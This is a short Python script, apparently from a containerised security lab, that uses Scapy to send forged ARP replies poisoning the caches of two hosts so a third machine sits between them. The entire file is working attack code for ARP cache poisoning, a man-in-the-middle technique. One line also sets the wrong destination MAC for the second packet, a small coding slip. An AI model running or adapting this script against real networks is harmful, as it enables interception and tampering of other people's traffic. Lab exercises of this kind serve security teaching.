from scapy.all import *

# Who can it be used? Write first!
A_ip = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B_ip = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"
M_ip = "10.9.0.105"
M_mac = "02:42:0a:09:00:69"

# Poisoning A's mac
# Sending ARP reply from M->A
ethA = Ether(src=M_mac, dst=A_mac)
arpA = ARP(hwsrc=M_mac, psrc=B_ip,
           hwdst=A_mac, pdst=A_ip)
arpA.op = 2

# Poisoning B's arp
# Sending reply from M->B
ethB = Ether(src=M_mac, dst=B_mac)
arpB = ARP(hwsrc=M_mac, psrc=A_ip,
           hwdst=A_mac, pdst=B_ip)
arpB.op = 2

pkt1 = ethA/arpA
pkt1.show()
sendp(pkt1, count=1)
pkt2 = ethB/arpB
pkt2.show()
sendp(pkt2, count=1)
